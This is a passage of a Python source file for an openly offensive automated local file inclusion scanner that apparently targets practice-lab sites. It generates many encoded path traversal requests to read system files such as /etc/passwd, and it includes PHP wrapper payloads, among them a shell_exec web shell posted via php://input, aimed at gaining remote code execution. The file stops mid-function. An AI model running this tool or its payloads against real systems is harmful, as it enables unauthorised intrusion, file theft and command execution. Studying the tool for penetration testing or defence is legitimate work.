#!/usr/bin/env python3
import math
import random
import sys
import concurrent.futures
import requests
import argparse
import os
import time
import queue
import signal
import json
import mutation
# This is necessary for disabling the 'verify=False' warning:
import urllib3
urllib3.disable_warnings()

version_number = '2.0.0'

#
# NOTE TO SELF
# CHECK OUT 0XDF'S WALKTHROUGH ON YOUTUBE FOR PIKATWOO FOR TURNING LFI INTO RCE ON NGINX TARGETS!!!
#

def load_json_file(file_path):
    """
    Load a JSON file and parse it into a dictionary.

    Args:
    - file_path (str): The path to the JSON file.

    Returns:
    - dict: The parsed JSON data.

    Raises:
    - FileNotFoundError: If the file does not exist.
    - json.JSONDecodeError: If the file is not valid JSON.
    - Exception: For any other exceptions.
    """
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
        return data
    except FileNotFoundError as fnf_error:
        print(f"Error loading JSON file: {fnf_error}")
        sys.exit(1)
    except json.JSONDecodeError as json_error:
        print(f"Error decoding JSON: {json_error}")
        sys.exit(1)
    except Exception as error:
        print(f"An unexpected error occurred: {error}")
        sys.exit(1)

# This is just to make the Help text more informative:
all_files_dict = load_json_file('file-list.json')
all_keywords = {'any'}
filename_length_bounds = [999,0]
for x in all_files_dict:
    for e in x.get('conditions'):
        all_keywords.add(e)
    filename_length = len(x.get('path'))
    if filename_length < filename_length_bounds[0]:
        filename_length_bounds[0] = filename_length
    if filename_length > filename_length_bounds[1]:
        filename_length_bounds[1] = filename_length
all_keywords_string = ', '.join(list(all_keywords))


parser = argparse.ArgumentParser(
    prog='alfie.py',
    description='''The Automatic Local File Inclusion Enumerator.
    Scan websites for local file inclusion vulnerabilities.''',
    epilog='Author: 4wayhandshake')
mode_help = '''Mode of operation: "scan", "enumerate", or "batch". 
Use "scan" to find a valid path traversal. The program will make requests using various traversals until at least one non-relative filepath is found.
Use "enumerate" to take a known path traversal, and try to enumerate files on the target system. If possible, attempts will be made to gain RCE.
Use "batch" to enter scan mode, then (if successful) proceed to enumerate afterwards.
'''
target_system_help = (f'List of attributes of the target system, to help choose what files to check for. '
                      f'No spaces. Ex "linux,php". Choose attributes from this list:\n{all_keywords_string}')
parser.add_argument('mode', choices=['filter', 'scan', 'enum', 'batch'], help=mode_help)
parser.add_argument('--version', action='version', version=f'%(prog)s {version_number}')
parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', help='Show extra output to console. Does not affect log file verbosity.')

scan_group = parser.add_argument_group('scan', 'Arguments for "scan" mode')
scan_group.add_argument('-u', '--url', dest='url', help='Base URI of the target. Ex. "http://mywebsite.htb/index.php?page="', type=str, required=True)
scan_group.add_argument('--min', dest='min', help='Minimum number of steps "back" to traverse.', type=int, default=1)
scan_group.add_argument('--max', dest='max', help='Maximum number of steps "back" to traverse.', type=int, default=10)

parser.add_argument('--target_system', dest='target_system', help=target_system_help, type=str, default='any')
parser.add_argument('-t', '--threads', dest='threads', help='Number of threads to use for processing.', type=int, default=40)
parser.add_argument('--timeout', dest='timeout', help='Timeout for each request (in seconds).', type=int, default=5)
parser.add_argument('-X', '--request-type', dest='request_type', help='Type of HTTP request to use. Ex "POST".', type=str, default='GET')
parser.add_argument('-b', '--cookies', dest='cookies', help='Cookies to include in each request. Ex "key1=value1; key2=value2" (Tip: use document.cookie in browser console)', type=str)
parser.add_argument('-d', '--data', dest='data', help='Data to include in each request. Only applies if using a POST request (see -X option). Ex "key1=value1; key2=value2".', type=str)
parser.add_argument('-fs', '--filter-sizes', dest='filter_sizes', help='Comma-separated list of sizes (in bytes) to filter from the results.', type=str)
parser.add_argument('-fw', '--filter-words', dest='filter_words', help='Comma-separated list of word counts to filter from the results.', type=str)
parser.add_argument('-fc', '--filter-codes', dest='filter_codes', help='Comma-separated list of HTTP status codes to filter from the results.', type=str)
parser.add_argument('-o', '--output', dest='output', help='File to log positive results.', type=str)
parser.add_argument('--no-color', dest='colorless', action='store_true', help='Don\'t ANSII color escapes in console output.')
parser.add_argument('--quiet', dest='quiet', action='store_true', help='Don\'t print the banner or options.')

parser.add_argument('-nx', '--no-extra-tests', dest='no_extra_tests', action='store_true', help='Don\'t run the extra LFI tests (only useful for WAF evasion).')
parser.add_argument('-ne', '--no-ending-checks', dest='no_ending_checks', action='store_true', help='Don\'t check for null-byte termination (to save time).')

args = parser.parse_args()

class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'
    BOLD = '\x1b[1m'
    UNBOLD = '\x1b[0m'

banner_colorless = '''
           ,ggg,
          dP""8I   ,dPYb, ,dPYb,                   ,,,,,,,,,,,,
         dP   88   IP'`Yb IP'`Yb                  : AUTOMATIC  :
        dP    88   I8  8I I8  8I   gg             : LOCAL      :
       ,8'    88   I8  8' I8  8'   ""             : FILE       :
       d88888888   I8 dP  I8 dP    gg    ,ggg,    : INCLUSION  :
 __   ,8"     88   I8dP   I8dP     88   i8" "8i   : ENUMERATOR :
dP"  ,8P      Y8   I8P    I8P      88   I8, ,8I    ````````````
Yb,_,dP       `8b,,d8b,_ ,d8b,_  _,88,_ `YbadP'    by
 "Y8P"         `Y88P'"Y88PI8"88888P""Y8888P"Y888   4wayhandshake
                          I8 `8,                        🤝🤝🤝🤝
//#//#//#//#//#//#//#//#/ I8  `8, //#//#//#//#//
                          I8   8I
                          I8   8I
                          I8, ,8'
                           "Y8P'
'''

banner = '''\033[94m
           ,ggg,
          dP""8I   ,dPYb, ,dPYb,                  \033[92m ,,,,,,,,,,,,  \033[0m \033[94m
         dP   88   IP'`Yb IP'`Yb                  \033[92m: \x1b[1mA\x1b[0m\033[92mUTOMATIC  : \033[0m \033[94m
        dP    88   I8  8I I8  8I   gg             \033[92m: \x1b[1mL\x1b[0m\033[92mOCAL      : \033[0m \033[94m
       ,8'    88   I8  8' I8  8'   ""             \033[92m: \x1b[1mF\x1b[0m\033[92mILE       : \033[0m \033[94m
       d88888888   I8 dP  I8 dP    gg    ,ggg,    \033[92m: \x1b[1mI\x1b[0m\033[92mNCLUSION  : \033[0m \033[94m
 __   ,8"     88   I8dP   I8dP     88   i8" "8i   \033[92m: \x1b[1mE\x1b[0m\033[92mNUMERATOR : \033[0m \033[94m
dP"  ,8P      Y8   I8P    I8P      88   I8, ,8I   \033[92m ```````````` \033[0m \033[94m
Yb,_,dP       `8b,,d8b,_ ,d8b,_  _,88,_ `YbadP'   \033[92m by \033[0m \033[94m
 "Y8P"         `Y88P'"Y88PI8"88888P""Y8888P"Y888  \033[92m 4wayhandshake \033[0m \033[94m
                          I8 `8,                        🤝🤝🤝🤝
//#//#//#//#//#//#//#//#/ I8  `8, //#//#//#//#//
                          I8   8I
                          I8   8I
                          I8, ,8'
                           "Y8P'\033[0m
'''
# See https://manytools.org/hacker-tools/ascii-banner/ for banner creation
# Font (nscript) by Normand Veilleux <nveilleu@emr.ca> Oct 7, 1994
# figletized by Peter Samuelson <psamuels@hmc.edu> Nov 29, 1994

# These are the extra tests to run, before enumerating path traversals
# Each should have (at least) a description, method, and url, and
# criteria for success (a series of checks to run on the response object)
extra_tests = [
    {
        'description': 'Checking for insecure PHP wrapper "expect":',
        'method': 'GET',
        'url': 'expect://id',
        'success_criteria': {
            # response should at least contain the string "uid"
            'contains': 'uid'
        }
    },
    {
        'description': 'Checking for insecure PHP wrapper "input":',
        'method': 'POST',
        'url': 'php://input&cmd=id',
        'data': "<?php echo shell_exec($_GET['cmd']); ?>",
        'success_criteria': {
            # response should at least contain the string "uid"
            'contains': 'uid='
        }
    },
    {
        'description': 'Checking for insecure PHP wrapper "input":',
        'method': 'POST',
        'url': 'php://input',
        'data': "<?php system('id'); ?>",
        'success_criteria': {
            # response should at least contain the string "uid"
            'contains': 'uid='
        }
    },
    {
        'description': 'Checking for insecure PHP wrapper "filter":',
        'method': 'GET',
        'url': 'php://filter/resource=../../../../../../../../etc/passwd',
        'success_criteria': {
            # response should include part of the base64 encoding of the root user
            'contains': 'root:'
        }
    },
    {
        'description': 'Checking for insecure PHP wrapper "filter" with b64 encoding:',
        'method': 'GET',
        'url': 'php://filter/convert.base64-encode/resource=../../../../../../../../etc/passwd',
        'success_criteria': {
            # response should include part of the base64 encoding of the root user
            'contains': 'cm9vdDp4'
        }
    }
]

traversals = [
    '../',
    '..\\',
    '....//',
    '..././',
    '....\\/',
    '....////'
]

#endings = ['', '%00', './'*2048]
endings = ['', '%00']

mutations = [
        mutation.identity,
        mutation.urlencode_specialchars,
        mutation.urlencode_morechars,
        mutation.double_urlencode_specialchars,
        mutation.double_urlencode_morechars
    ]

bypasses = [
    mutation.identity,
    mutation.slash_bypass
]

s = requests.session()
exit_flag = False # Global flag to signal threads to exit

# Use some globals to store info used in every request
filter_codes = []
filter_sizes = []
filter_words = []
request_cookie = None
request_data = None
files_to_test = []
max_request_index = -1
successes = {}


def string_to_dict(s):
    if s is None:
        return None
    # Parse a cookie-like string into a dict
    key_value_pairs = [e.strip() for e in s.split(';')]
    dict = {}
    for kvp in key_value_pairs:
        k, v = kvp.split('=',1)
        # According to the HTTP cookie specification (RFC 6265),
        # cookie values cant contain semicolon, comma, or whitespace
        if any((c == ';' or c == ',' or c.isspace()) for c in v):
            raise ValueError
        dict[k] = v
    if len(dict) == 0:
        raise ValueError
    return dict


def parse_cookie(s):
    if s is None:
        return None
    cookie_dict = string_to_dict(s)
    # return a requests cookiejar from a dictionary
    return requests.utils.cookiejar_from_dict(cookie_dict)


def parse_data(s):
    return string_to_dict(s)


def comma_separated_numbers_or_ranges(s):
    """
    :param s: a comma-separated string of integers and ranges, with no spaces. Ex. "4,3,7-9,15"
    :return: list of all integers inclusive to the ranges, or the integers themselves. Ex. [3,4,7,8,9,15]
    """
    numbers = []
    for ss in s.split(','):
        try:
            if '-' in ss:
                r = [int(x) for x in ss.split('-')]
                if len(r) != 2:
                    raise ValueError
                for x in range(min(r), max(r)+1):
                    numbers.append(int(x))
            else:
                numbers.append(int(ss))
        except ValueError:
            print(f'Invalid argument provided: "{s}"\n'
                  f'Please provide comma-separated integers/ranges, with no spaces. Ex. "4,3,7-9,15"')
            sys.exit(1)
    return sorted(numbers)


def validate_args():

    def is_positive_int(x):
        return x >= 0

    def all_positive_ints(l):
        for e in l:
            if not is_positive_int(e):
                return False
        return True

    if args.request_type.upper() not in ['GET','POST']:
        print("Invalid request type provided. Only GET and POST are supported")
        sys.exit(1)

    if not is_positive_int(args.min) or args.min <= 0:
        print("Invalid minimum traversal depth provided (must be at least 1)"
              "For traversal depth of 0 use a different tool, like wfuzz or ffuf.")
        sys.exit(1)

    if not is_positive_int(args.max) or args.max < args.min:
        print("Invalid maximum traversal depth provided (must be greater than or equal to min depth)")
        sys.exit(1)

    if args.filter_codes:
        global filter_codes
        filter_codes = comma_separated_numbers_or_ranges(args.filter_codes)
        if not all_positive_ints(filter_codes):
            print("Invalid filter-codes argument. All must be positive integers")
            sys.exit(1)

    if args.filter_sizes:
        global filter_sizes
        filter_sizes = comma_separated_numbers_or_ranges(args.filter_sizes)
        if not all_positive_ints(filter_sizes):
            print("Invalid filter-sizes argument. All must be positive integers")
            sys.exit(1)

    if args.filter_words:
        global filter_words
        filter_words = comma_separated_numbers_or_ranges(args.filter_words)
        if not all_positive_ints(filter_words):
            print("Invalid filter-words argument. All must be positive integers")
            sys.exit(1)

    if args.cookies:
        global request_cookie
        try:
            request_cookie = parse_cookie(args.cookies)
        except ValueError as e:
            if args.colorless:
                print(f'Warning: invalid cookies provided.\nPlease use this format: "key1=value1; key2=value2".\nProceeding without cookies.\n')
            else:
                print(f'{colors.MAGENTA}Warning: invalid cookies provided.{colors.END}\nPlease use this format: "key1=value1; key2=value2".\nProceeding without cookies.\n')
            request_cookie = None
        except Exception as e:
            if args.colorless:
                print(f'An error occurred while parsing cookies:\n{e}\n')
            else:
                print(f'{colors.MAGENTA}An error occurred while parsing cookies:{colors.END}\n{e}\n')
            sys.exit(1)

    if args.data:
        global request_data
        try:
            request_data = parse_data(args.data)
        except ValueError as e:
            if args.colorless:
                print(f'Warning: invalid request data provided.\nPlease use this format: "key1=value1; key2=value2".\nProceeding without request data.\n')
            else:
                print(f'{colors.MAGENTA}Warning: invalid request data provided.{colors.END}\nPlease use this format: "key1=value1; key2=value2".\nProceeding without request data.\n')
            request_data = None
        except Exception as e:
            if args.colorless:
                print(f'An error occurred while parsing request data:\n{e}\n')
            else:
                print(f'{colors.MAGENTA}An error occurred while parsing request data:{colors.END}\n{e}\n')
            sys.exit(1)

    if args.target_system:
        targets = args.target_system.split(',')
        if not all([t in all_keywords for t in targets]):
            print(f'Invalid list of target_system provided: "{args.target_system}".\n'
                  f'Provide a comma-separated list (without spaces), of any of these: {all_keywords_string}')
            sys.exit(1)


def loadWordlist(filename):
    if (filename[0] in '/\\'):
        # absolute path was provided
        filepath = filename
    else:
        # relative path was provided
        filepath = os.path.join(os.path.dirname(__file__), filename)
    # Read the file, remove the whitespace from each line
    with open(filepath, 'r') as f:
        return [ line.rstrip() for line in f.readlines() ]


def load_files_list(targets_string):
    global files_to_test
    for f in all_files_dict:
        if any([(target.lower() == 'any' or target.lower() in f.get('conditions'))
                for target in targets_string.split(',')]):
            files_to_test.append(f)
    for ftt in files_to_test:
        ftt["found"] = False


def matches(resp, url):
    ret = True
    code = int(resp.status_code)
    byte_count = len(resp.content)
    word_count = len(resp.text.split())
    if code in filter_codes:
        ret = False
    if byte_count in filter_sizes:
        ret = False
    if word_count in filter_words:
        ret = False
    # if ret:
    #     if args.verbose:
    #         if args.colorless:
    #             print(f"{' '*64}\n[+] {url:<60}\n    HTTP {code:<8} Size: {byte_count:<12} Words: {word_count:<20}")
    #         else:
    #             print(f"{' '*64}\n{colors.GREEN}[+] {url:<60}{colors.END}\n    HTTP {code:<8} Size: {byte_count:<12} Words: {word_count:<20}")
    #     else:
    #         if args.colorless:
    #             print(f"[+] {url:<60}")
    #         else:
    #             print(f"{colors.GREEN}[+] {url:<60}{colors.END}")
    # elif args.verbose:
    #     if args.colorless:
    #         print(f"{' '*64}\n[-] {url:<60}\n    HTTP {code:<8} Size: {byte_count:<12} Words: {word_count:<20}")
    #     else:
    #         print(f"{' '*64}\n{colors.RED}[-] {url:<60}{colors.END}\n    HTTP {code:<8} Size: {byte_count:<12} Words: {word_count:<20}")
    return ret


def make_request(method, url, req_cookie, req_json, req_data=None):
    try:
        if method == 'POST':
            response = requests.post(url, cookies=req_cookie, json=req_json, data=req_data, timeout=args.timeout)
        else:
            response = requests.get(url, cookies=req_cookie, timeout=args.timeout)
        if args.verbose:
            code = int(response.status_code)
            num_bytes = len(response.content)
            num_words = len(response.text.split())
            print(f"{' '*64}\n[+] {url:<60}\n    HTTP {code:<8} Size: {num_bytes:<12} Words: {num_words:<20}")
        return response
    except requests.RequestException as e:
        if args.colorless:
            print(f'An error occurred while making a request to {url}:\n{e}\n')
        else:
            print(f'{colors.MAGENTA}An error occurred while making a request to {url}:{colors.END}\n{e}\n')
        return None


def process_urls(job_queue, exit_on_success=False, ignore_filters=False):
    global exit_flag, max_request_index
    while not exit_flag:
        try:
            job = job_queue.get(timeout=1)
            if job is not None:
                url = job.get('url')
                method = args.request_type.upper()
                resp = make_request(method, url, request_cookie, request_data)
                if (resp is not None) and (ignore_filters or matches(resp, url)):
                    job['numerics'] = {
                        'status_code': resp.status_code,
                        'byte_count': len(resp.content),
                        'word_count': len(resp.text.split())
                    }
                    global successes
                    # Initialize this entry if it's the first time finding this file
                    if job['filepath'] not in successes:
                        successes[job['filepath']] = []
                    successes[job['filepath']].append(job)
                    if exit_on_success:
                        exit_flag = True
                if job['idx'] > max_request_index:
                    max_request_index = job['idx']
                job_queue.task_done()
        except queue.Empty:
            exit_flag = True
            continue
        except Exception as e:
            print(e)


def signalHandler(signum, frame):
    global exit_flag
    exit_flag = True
    print("\nCancelling jobs. One sec...\n")


def writeLogfile(filename, successful_urls):
    if (filename[0] in '/\\'):
        filepath = filename # absolute path was provided
    else:
        # relative path was provided
        filepath = os.path.join(os.path.dirname(__file__), filename)
    try:
        with open(filepath, 'w') as f:
            for url in successful_urls:
                f.write(url+'\n')
    except FileNotFoundError:
        print(f"Error: The file \'{filepath}\' could not be found.")
    except PermissionError:
        print(f"Error: Permission denied. Unable to write to the file \'{filepath}\'.")
    except Exception as e:
        print(f"While writing the output file, an unexpected error occurred: {e}")


def printOptions(mode):
    print('='*64)
    print(f'URL: {args.url:>59}')
    if args.verbose:
        print(f'Verbose mode: {"enabled":>50}')
    # if args.lfi_wordlist != parser.get_default('lfi_wordlist'):
    #     print(f'LFI wordlist: {args.lfi_wordlist:>50}')
    # if args.fuzz_wordlist != parser.get_default('fuzz_wordlist'):
    #     print(f'Fuzz wordlist: {args.fuzz_wordlist:>49}')
    if args.threads != parser.get_default('threads'):
        print(f'Threads: {args.threads:>55}')
    if args.filter_codes != parser.get_default('filter_codes'):
        print(f'HTTP code filter: {args.filter_codes.upper():>46}')
    if args.filter_sizes != parser.get_default('filter_sizes'):
        print(f'Size filter (bytes): {args.filter_sizes:>43}')
    if args.filter_words != parser.get_default('filter_words'):
        print(f'Word count filter (# words): {args.filter_words:>35}')
    if args.min != parser.get_default('min'):
        print(f'Minimum traversal steps: {args.min:>39}')
    if args.max != parser.get_default('max'):
        print(f'Maximum traversal steps: {args.max:>39}')
    if args.timeout != parser.get_default('timeout'):
        print(f'Timeout: {args.timeout:>54}s')
    if args.request_type != parser.get_default('request_type'):
        print(f'Request type: {args.request_type.upper():>50}')
    if args.cookies:
        print(f'Cookies: {args.cookies:>55}')
    if args.data:
        print(f'Data: {args.data:>58}')
    #if args.ending != parser.get_default('ending'):
    #    s = f'"{args.ending}"'
    #    print(f'Ending string: {s:>49}')
    if args.output:
        print(f'Output file: {args.output:>51}')
    if args.colorless:
        print(f'Colorless mode: {"omit ANSII color codes in all output":>48}')
    if args.no_extra_tests:
        print(f'No extra tests: {"only run the defined enumeration, no extras":>48}')
    if args.no_ending_checks:
        print(f'No ending checks: {"do not check for null-byte termination":>46}')
    print('='*64+'\n')


def runExtraTests(tests):

    def testSuccess(criteria, response):
        # all of the criteria must be met for the test to be considered successful
        # Check the status code
        criterion = criteria.get('code', None)
        if criterion is not None:
            if response.status_code != criterion:
                return False
        # Check if the response is the right size (in bytes)
        criterion = criteria.get('size', None)
        if criterion is not None:
            if len(response.content) != criterion:
                return False
        # Check if the response is the right size
        criterion = criteria.get('words', None)
        if criterion is not None:
            if len(response.text.split()) != criterion:
                return False
        # Check if body contains the substring
        criterion = criteria.get('contains', None)
        if criterion is not None:
            if response.text.find(criterion) == -1:
                return False
        return True

    if args.verbose:
        print("Running extra tests...")
    for test in tests:
        # Collect components of the request
        #ending = args.ending if args.ending else ''
        uri_base = f'{args.url}{test.get("url","")}'
        c = request_cookie
        d = test.get('data', None)
        terminations = [''] if args.no_ending_checks else endings
        # Print a message stating which test is happening
        payload_output = ''
        if d is not None:
            payload_output = f'\n    Payload: {d:<55}'
        if args.verbose:
            if args.colorless:
                print(f"{' '*64}\n[?] {test['description']}{payload_output}")
            else:
                print(f"{' '*64}\n{colors.YELLOW}[?] {test['description']:<60}{colors.END}{payload_output}")
        # issue the request then test the response
        method = test['method']
        for termination in terminations:
            uri = f'{uri_base}{termination}'
            resp = make_request(method, uri, req_cookie=c, req_json=None, req_data=d)
            if testSuccess(test['success_criteria'], resp):
                if args.verbose:
                    if args.colorless:
                        print(f"[+] {method + ' ' + uri:<60}\n    Passed checks: {''.join(test['success_criteria'].keys()):<45}")
                    else:
                        print(f"{colors.GREEN}[+] {method + ' ' + uri:<60}{colors.END}\n    Passed checks: {''.join(test['success_criteria'].keys()):<45}")
                else:
                    if args.colorless:
                        print(f"[+] {method + ' ' + uri:<60}")
                    else:
                        print(f"{colors.GREEN}[+] {method + ' ' + uri:<60}{colors.END}")
            elif args.verbose:
                if args.colorless:
                    print(f"[-] {method + ' ' + uri:<60}\n    Failed check(s): {''.join(test['success_criteria'].keys()):<41}")
                else:
                    print(f"{colors.RED}[-] {method + ' ' + uri:<60}{colors.END}\n    Failed check(s): {''.join(test['success_criteria'].keys()):<41}")
    if args.verbose:
        print("\nDone running extra tests.")


def probe_for_filters(repetitions):
    """
    Try a bunch of requests, using the mutations and bypasses that we might
    utilize in "scan" mode. These requests should all be 'negative' results.
    Collect counts of status_code, byte_count, and word_count for the requests.
    Try to discern very common status_code, byte_count, and word_counts, then
    set those as the filters for the rest of the program.
    :param repetitions: number of times to resample each combination of traversal, encoding, etc.
    :return: a dictionary with suggested filters, and the probabilities they occur at
    """
    def random_ele(lst):
        return lst[random.randint(0,len(lst)-1)]

    def random_filename(length):
        alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_'
        s = ''
        for _ in range(length):
            s += random_ele(alphabet)
        return s

    def dict_argmax(d):
        return max(d, key=d.get)

    def calc_basic_stats(d):
        """
        :param d: dictionary where keys are the manip variable and values are the responding variable
        :return: (count,sum,average,stddev)
        """
        N = len(d)
        Sigma = sum(d.values())
        mu = Sigma / N
        sigma = math.sqrt(sum((x-mu)**2 for x in d.values()) / N)
        return {
            'count': N,
            'min': min(d.values()),
            'max': max(d.values()),
            'sum': Sigma,
            'mean': mu,
            'stddev': sigma
        }

    def find_high_outliers(d, mu, sigma, scale=1.0):
        # Return the keys of all values that are more than `scale` standard deviations from the mean
        outliers = []
        for (k, v) in d.items():
            if abs(v - mu) >= (sigma * scale):
                outliers.append(k)
        return outliers

    def probability(mu, sigma, sample_value):
        # Probability density function for the normal distribution
        print(mu, sigma, sample_value)
        if sigma == 0:
            if sample_value == mu:
                return 1.0
            return 0
        return (1 / (sigma * math.sqrt(2 * math.pi))) * math.exp(-((sample_value - mu) ** 2) / (2 * sigma ** 2))

    extensions = ['', '.php', '.js', '.py', '.ini', '.sys', '.bat']

    # dicts to hold the results of requests
    status_codes_counts = {}
    byte_count_counts = {}
    word_count_counts = {}

    # Create a queue of requests to make
    job_queue = queue.Queue()

    idx = 0
    for slash in ['', '/']:
        for traversal in traversals:
            for ending in endings:
                for _mutation in mutations:
                    for _bypass in bypasses:
                        for _ in range(repetitions):
                            filepath = random_filename(random.randint(filename_length_bounds[0], filename_length_bounds[1])) + random_ele(extensions)
                            base_resource = f'{slash}{traversal}{filepath}{ending}'
                            modified_resource = _bypass(_mutation(base_resource))
                            url = args.url + modified_resource
                            # Enqueue the request
                            job = {
                                "filepath": filepath,
                                "traversal": traversal,
                                "depth": 1,
                                "leading_slash": (slash == '/'),
                                "ending": ending,
                                "mutation": _mutation.__name__,
                                "bypass": _bypass.__name__,
                                "url": url,
                                "idx": idx
                            }
                            job_queue.put(job)
                            idx += 1
    # Reset the successes dict
    global successes
    successes = {}
    # Start issuing requests
    total_jobs = concurrent_async_requests(job_queue, exit_early=False, ignore_filters=True)

    # Count up the results
    for filepath in successes:
        for job in successes[filepath]:
            if ('numerics' not in job or
                    not all([k in job['numerics'] for k in ['status_code', 'byte_count', 'word_count']])):
                print(f'Job has no "numerics" key, or "numerics" lacks the necessary keys.'
                      f' Can\'t analyze the success of of the response to the request!')
                return None
            resp_code =  job['numerics']['status_code']
            resp_size =  job['numerics']['byte_count']
            resp_words = job['numerics']['word_count']
            if resp_code not in status_codes_counts:
                status_codes_counts[resp_code] = 0
            if resp_size not in byte_count_counts:
                byte_count_counts[resp_size] = 0
            if resp_words not in word_count_counts:
                word_count_counts[resp_words] = 0
            status_codes_counts[resp_code] += 1
            byte_count_counts[resp_size] += 1
            word_count_counts[resp_words] += 1

    status_code_stats = calc_basic_stats(status_codes_counts)
    byte_count_stats = calc_basic_stats(byte_count_counts)
    word_count_stats = calc_basic_stats(word_count_counts)

    probable_fc = [(k, (status_codes_counts[k]/status_code_stats['sum']))
                   for k in find_high_outliers(status_codes_counts,
                                               status_code_stats['mean'],
                                               status_code_stats['stddev'],
                                               scale=1.5)]
    probable_fs = [(k, (byte_count_counts[k]/byte_count_stats['sum']))
                   for k in find_high_outliers(byte_count_counts,
                                               byte_count_stats['mean'],
                                               byte_count_stats['stddev'],
                                               scale=1.5)]
    probable_fw = [(k, (word_count_counts[k]/word_count_stats['sum']))
                   for k in find_high_outliers(word_count_counts,
                                               word_count_stats['mean'],
                                               word_count_stats['stddev'],
                                               scale=0)]
    return {
        'num_requests': total_jobs,
        'fc': {
            'candidates': probable_fc
        },
        'fs': {
            'candidates': probable_fs,
            'range': [byte_count_stats.get('min'), byte_count_stats.get('max')]
        },
        'fw': {
            'candidates': probable_fw,
            'range': [word_count_stats.get('min'), word_count_stats.get('max')]
        }
    }


def scan():
    """
    Perform the "scan" mode. The idea here is to disclose one file. Once we find one file,
    we will have found a successful combination of traversal pattern, depth of traversal,
    an encoding scheme, etc.
    Once "scan" mode finds this successful combination, we can greatly expedite "enum" mode.
    :return: True if a traversal was found, otherwise False.
    """
    # Create a queue of requests to make
    job_queue = queue.Queue()
    # index of request. They might not come out sequentially
    idx = 0
    # For increasing levels of depth...
    for depth in range(args.min, args.max + 1):
        request_queue = queue.Queue()
        # Show progress indicating what level of depth we're at?
        # For each file...
        for target_file in files_to_test:
            # Don't try to find this file if the path is parameterized (those are for "enumerate" mode only)
            if 'variables' in target_file:
                continue
            filepath = target_file.get('path')
            # Trim off the leading slash from the filepath, if one is present
            if filepath.startswith('/') and len(filepath) > 1:
                filepath = filepath[1:]
            # Try with a leading slash and without
            for slash in ['', '/']:
                # For each traversal type...
                for traversal in traversals:
                    # For each ending type...
                    for ending in endings:
                        base_resource = f'{slash}{depth * traversal}{filepath}{ending}'
                        # For each mutation...
                        for _mutation in mutations:
                            for _bypass in bypasses:
                                if exit_flag:
                                    break
                                modified_resource = _bypass(_mutation(base_resource))
                                url = args.url + modified_resource
                                # Enqueue the request
                                job = {
                                    "filepath": target_file.get('path'),
                                    "traversal": traversal,
                                    "depth": depth,
                                    "leading_slash": (slash == '/'),
                                    "ending": ending,
                                    "mutation": _mutation.__name__,
                                    "bypass": _bypass.__name__,
                                    "url": url,
                                    "idx": idx
                                }
                                job_queue.put(job)
                                idx += 1
    # Reset the successes dict
    global successes
    successes = {}
    # Start issuing requests
    return concurrent_async_requests(job_queue, exit_early=True, ignore_filters=False)


def concurrent_async_requests(job_queue, exit_early, ignore_filters):
    """
    Issue requests concurrently. Use up to the defined number of threads. SIGINT will terminate
    all requests and prevent new ones from starting.
    :param job_queue: a queue.Queue object, where each item is a "job". The "job" is a dict that
    must have at least these keys: url, filepath, idx
    :param exit_early: process requests such that they stop after the first one deemed "successful"
    :param ignore_filters: When True, all requests are deemed "successful"
    :return: total number of jobs that were enqueued
    """
    num_jobs = job_queue.qsize()
    # In case there are fewer jobs than threads, don't create extra threads
    N = min(args.threads, num_jobs)
    with concurrent.futures.ThreadPoolExecutor(max_workers=N) as executor:
        # Submit the process_urls function for each worker thread
        workers = [executor.submit(process_urls,
                                   job_queue,
                                   exit_on_success=exit_early,
                                   ignore_filters=ignore_filters) for _ in range(N)]
        # Wait for all tasks to complete
        try:
            # Wait for all tasks to complete
            while not exit_flag:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("")
        # Stop the worker threads by adding None to the queue for each worker
        for _ in range(N):
            job_queue.put(None)
        # Wait for all worker threads to finish
        concurrent.futures.wait(workers)
    return num_jobs


def filter_probe_report(suggested_fc, suggested_fs, suggested_fw):

    fc = suggested_fc['candidates']
    fs = suggested_fs['candidates']
    fw = suggested_fw['candidates']

    fc_suggestion_text, fs_suggestion_text, fw_suggestion_text, = '', '', ''

    # Suggest a HTTP status code filter
    # Don't ever suggest to filter out HTTP 200
    codes = sorted([str(x[0]) for x in fc])
    if '200' in codes:
        codes.remove('200')
    s = ','.join(codes)
    if len(codes) > 0:
        fc_suggestion_text = f"-fc '{s}'"

    # Do a quick check to see if the filename was getting reflected (should have the same range as the filename lengths)
    fs_vals = [x[0] for x in fs]
    # if the range of byte counts is within 5 of the filename length bounds, then suggest a range
    filename_length_range = filename_length_bounds[1] - filename_length_bounds[0]
    fs_val_range = suggested_fs['range'][1] - suggested_fs['range'][0]
    if fs_val_range < filename_length_range + 9:
        fs_suggestion_text_min = int((max(fs_vals) + min(fs_vals))//2 - (filename_length_range//2 + 3))
        fs_suggestion_text_max = int((max(fs_vals) + min(fs_vals))//2 + (filename_length_range//2 + 6))
        fs_suggestion_text = f"-fs '{fs_suggestion_text_min}-{fs_suggestion_text_max}'"

    # Suggest a word count filter
    if len(fw) < 5:
        s = ','.join(sorted([str(x[0]) for x in fw]))
        fw_suggestion_text = f"-fw '{s}'"

    if len(fc) > 0 or len(fc) > 0 or len(fc) > 0:
        if args.colorless:
            print(f"{' ' * 64}\n[+] Initial tests showed that these filters might be useful: ")
        else:
            print(f"{' ' * 64}\n{colors.GREEN}[+] Initial tests showed that these filters might be useful: {colors.END}")
        if len(fc) > 0:
            print("    HTTP status code (-fc, --filter-codes):")
            for f in fc:
                print(f'        {f[0]:<4} ({(f[1]*100):.1f}%)')
        if len(fs) > 0:
            print("    Response size, in bytes (-fs, --filter-size):")
            for f in fs:
                print(f'        {f[0]:<6} ({(f[1]*100):.1f}%)')
        if len(fw) > 0:
            print("    Response word count (-fw, --filter-words):")
            for f in fw:
                print(f'        {f[0]:<6} ({(f[1]*100):.1f}%)')
        suggestion_text = ' '.join([fc_suggestion_text, fs_suggestion_text, fw_suggestion_text])
        if suggestion_text and suggestion_text != '':
            if args.colorless:
                print(f"{' ' * 64}\nTry using the following filters when you run "
                      f"\"scan\" and \"enum\" modes: \n    {suggestion_text}")
            else:
                print(f"{' ' * 64}\nTry using the following filters when you run "
                      f"\"scan\" and \"enum\" modes: \n    {colors.GREEN}{suggestion_text}{colors.END}")
    else:
        if args.colorless:
